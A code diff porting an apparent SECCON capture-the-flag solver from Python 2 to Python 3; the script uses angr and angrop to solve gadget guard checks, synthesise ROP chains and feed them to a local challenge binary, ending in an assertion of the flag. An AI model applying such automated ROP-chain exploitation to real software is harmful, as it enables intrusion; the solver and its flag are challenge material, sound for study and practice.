@@ -28,9 +28,9 @@ def make_elf(gadgets):
     for i in reversed(range(2, 20)):
         the_bytes = the_bytes.replace('\xf4'*i, '\xcc'*i)
     the_bytes = the_bytes.replace('\xc3\xf4', '\xc3\xcc')
-    print "gadgets length:", len(the_bytes)
+    print("gadgets length:", len(the_bytes))
     the_bytes = the_bytes.ljust(4096, "\xcc")
-    print "gadgets: %r" % the_bytes[:100]
+    print("gadgets: %r" % the_bytes[:100])
     the_nops = open('nop.elf').read()
     the_gadgets = the_nops.replace("\x90"*4096, the_bytes)
     open('gadgets.elf', 'w').write(the_gadgets)
@@ -132,7 +132,7 @@ def get_gadgets():
         # we save off inputs needed to pass the checks for any given gadget before the start of the checks.
         # Since the checks pop data in order, we can just concat all the checked input.
         for a in range(f.addr, start_of_checks):
-            guard_solutions[a] = good_state.solver.eval(claripy.Concat(*symbolic_guard_guys), cast_to=str)
+            guard_solutions[a] = good_state.solver.eval(claripy.Concat(*symbolic_guard_guys), cast_to=bytes)
 
         #
         # With the checks recovered, we now overwrite them with a ret, so that angrop considers the gadgets
@@ -193,13 +193,13 @@ def test():
     try:
         for _ in range(5):
             r.stdout.read(6)
-            print "STAGE:", r.stdout.read(1)
+            print("STAGE:", r.stdout.read(1))
             r.stdout.read(3)
 
             # Get the gadgets
             time.sleep(1)
-            gadgets = ""
-            while not gadgets.endswith('\n'):
+            gadgets = b""
+            while not gadgets.endswith(b'\n'):
                 read = r.stdout.read(1)
                 if not read:
                     raise Exception("server terminated unexpectedly")
@@ -213,16 +213,16 @@ def test():
             chain = get_gadgets()
 
             # Send the gadgets
-            r.stdin.write(base64.b64encode(chain) + "\n")
+            r.stdin.write(base64.b64encode(chain).encode() + b"\n")
 
             # Make sure things are good
             status = r.stdout.read(3).strip()
-            assert status == "OK"
+            assert status == b"OK"
 
         # After 5 successful rop synths, the binary sends up the flag.
         flag = r.stdout.read(128).strip()
-        print "LOCAL FLAG:", flag
-        assert flag == 'SECCON{HAHAHHAHAHAAHA}'
+        print("LOCAL FLAG:", flag)
+        assert flag == b'SECCON{HAHAHHAHAHAAHA}'
     finally:
         r.kill()
 
